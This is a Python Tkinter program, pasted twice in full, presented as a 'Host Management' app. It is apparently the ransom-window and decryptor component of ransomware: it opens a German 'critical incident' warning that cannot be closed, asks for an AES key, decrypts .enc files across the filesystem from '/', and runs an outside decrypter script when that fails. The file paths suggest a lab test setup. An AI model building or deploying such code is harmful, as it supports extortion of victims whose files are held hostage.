import tkinter as tk
from tkinter import messagebox
import subprocess
import os
import base64
from Crypto.Cipher import AES

class HostManagementApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Host Management")
        self.root.geometry("400x300")

        self.label = tk.Label(root, text="Host Management App", font=("Helvetica", 16))
        self.label.pack(pady=20)

        self.show_warning_button = tk.Button(root, text="Show Warning", command=self.create_warning, font=("Helvetica", 14))
        self.show_warning_button.pack(pady=20)

    def decrypt_file(self, encrypted_file_path, aes_key):
        try:
            with open(encrypted_file_path, 'rb') as f:
                nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
            
            cipher = AES.new(base64.b64decode(aes_key), AES.MODE_EAX, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            
            decrypted_file_path = encrypted_file_path[:-4]  # Remove '.enc' extension
            with open(decrypted_file_path, 'wb') as f:
                f.write(plaintext)
            
            return decrypted_file_path, True
        except Exception as e:
            print(f"Decryption failed: {str(e)}")
            return None, False

    def send_status_to_main_app(self, status):
        # Code to send the status back to the main application
        print(f"Status: {status}")

    def decrypt_all_files(self, directory, aes_key):
        success_count = 0
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(".enc"):
                    encrypted_file_path = os.path.join(root, file)
                    decrypted_file_path, success = self.decrypt_file(encrypted_file_path, aes_key)
                    if success:
                        success_count += 1
                    else:
                        return False
        return success_count > 0

    def on_decrypt(self):
        aes_key = self.aes_key_entry.get()
        directory = "/"  # Change this to your target directory
        
        success = self.decrypt_all_files(directory, aes_key)
        
        if success:
            self.send_status_to_main_app("decrypted")
            messagebox.showinfo("Erfolg", "Alle Dateien erfolgreich entschlüsselt.")
            self.root.destroy()
        else:
            messagebox.showerror("Fehler", "Entschlüsselung fehlgeschlagen.")
            subprocess.run(["/home/victim3/Testumgebung/decrypter.sh", aes_key])
    def create_warning(self):
        warning_window = tk.Toplevel(self.root)
        warning_window.title("Warnung")
        warning_window.geometry("400x250")

        label = tk.Label(warning_window, text="Kritischer Vorfall! Bitte sofort handeln!", font=("Helvetica", 16), fg="red")
        label.pack(pady=10)

        key_label = tk.Label(warning_window, text="AES Key:", font=("Helvetica", 14))
        key_label.pack(pady=5)

        self.aes_key_entry = tk.Entry(warning_window, show="*", font=("Helvetica", 14))
        self.aes_key_entry.pack(pady=5)

        decrypt_button = tk.Button(warning_window, text="Entschlüsseln", command=self.on_decrypt, font=("Helvetica", 14))
        decrypt_button.pack(pady=20)

        warning_window.protocol("WM_DELETE_WINDOW", lambda: None)  # Deaktiviert das Schließen des Fensters über das 'X'

if __name__ == "__main__":
    root = tk.Tk()
    app = HostManagementApp(root)
    root.mainloop()

import tkinter as tk
from tkinter import messagebox
import subprocess
import os
import base64
from Crypto.Cipher import AES

class HostManagementApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Host Management")
        self.root.geometry("400x300")

        self.label = tk.Label(root, text="Host Management App", font=("Helvetica", 16))
        self.label.pack(pady=20)

        self.show_warning_button = tk.Button(root, text="Show Warning", command=self.create_warning, font=("Helvetica", 14))
        self.show_warning_button.pack(pady=20)

    def decrypt_file(self, encrypted_file_path, aes_key):
        try:
            with open(encrypted_file_path, 'rb') as f:
                nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
            
            cipher = AES.new(base64.b64decode(aes_key), AES.MODE_EAX, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            
            decrypted_file_path = encrypted_file_path[:-4]  # Remove '.enc' extension
            with open(decrypted_file_path, 'wb') as f:
                f.write(plaintext)
            
            return decrypted_file_path, True
        except Exception as e:
            print(f"Decryption failed: {str(e)}")
            return None, False

    def send_status_to_main_app(self, status):
        # Code to send the status back to the main application
        print(f"Status: {status}")

    def decrypt_all_files(self, directory, aes_key):
        success_count = 0
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(".enc"):
                    encrypted_file_path = os.path.join(root, file)
                    decrypted_file_path, success = self.decrypt_file(encrypted_file_path, aes_key)
                    if success:
                        success_count += 1
                    else:
                        return False
        return success_count > 0

    def on_decrypt(self):
        aes_key = self.aes_key_entry.get()
        directory = "/"  # Change this to your target directory
        
        success = self.decrypt_all_files(directory, aes_key)
        
        if success:
            self.send_status_to_main_app("decrypted")
            messagebox.showinfo("Erfolg", "Alle Dateien erfolgreich entschlüsselt.")
            self.root.destroy()
        else:
            messagebox.showerror("Fehler", "Entschlüsselung fehlgeschlagen.")
            subprocess.run(["/home/victim3/Testumgebung/decrypter.sh", aes_key])
    def create_warning(self):
        warning_window = tk.Toplevel(self.root)
        warning_window.title("Warnung")
        warning_window.geometry("400x250")

        label = tk.Label(warning_window, text="Kritischer Vorfall! Bitte sofort handeln!", font=("Helvetica", 16), fg="red")
        label.pack(pady=10)

        key_label = tk.Label(warning_window, text="AES Key:", font=("Helvetica", 14))
        key_label.pack(pady=5)

        self.aes_key_entry = tk.Entry(warning_window, show="*", font=("Helvetica", 14))
        self.aes_key_entry.pack(pady=5)

        decrypt_button = tk.Button(warning_window, text="Entschlüsseln", command=self.on_decrypt, font=("Helvetica", 14))
        decrypt_button.pack(pady=20)

        warning_window.protocol("WM_DELETE_WINDOW", lambda: None)  # Deaktiviert das Schließen des Fensters über das 'X'

if __name__ == "__main__":
    root = tk.Tk()
    app = HostManagementApp(root)
    root.mainloop()